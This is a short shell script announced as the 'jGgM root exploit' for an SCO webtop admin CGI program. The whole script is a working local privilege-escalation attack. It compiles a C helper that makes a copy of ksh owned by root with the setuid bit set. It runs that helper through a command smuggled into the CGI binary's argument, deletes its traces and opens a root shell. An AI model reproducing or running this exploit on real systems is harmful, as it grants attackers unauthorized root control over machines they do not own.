#!/bin/sh

## jggm@mail.com

CC="gcc"
SCOADMIN=/opt/webtop/bin/i3un0212/cgi-
bin/admin/scoadminreg.cgi

#
#
#
#

echo
echo "jGgM root exploit"
echo "http://www.netemperor.com/"
echo
echo "Mail: jggm@mail.com"
echo

if [ ! -x $SCOADMIN ]; then
   echo "$SCOADMIN file not found"
   exit 2;
fi

cat >/tmp/jggm.c <<_EOF

main()
{
   setuid(0);
   setgid(0);
   chown("/tmp/jGgM_Shell", 0, 0);
   chmod("/tmp/jGgM_Shell", 04755);
}
_EOF

cp /bin/ksh /tmp/jGgM_Shell
$CC -o /tmp/jggm /tmp/jggm.c

$SCOADMIN "-c /tmp/jggm;/tmp/jggm;"

rm -rf /tmp/jggm /tmp/jggm.c

/tmp/jGgM_Shell

# end of file..
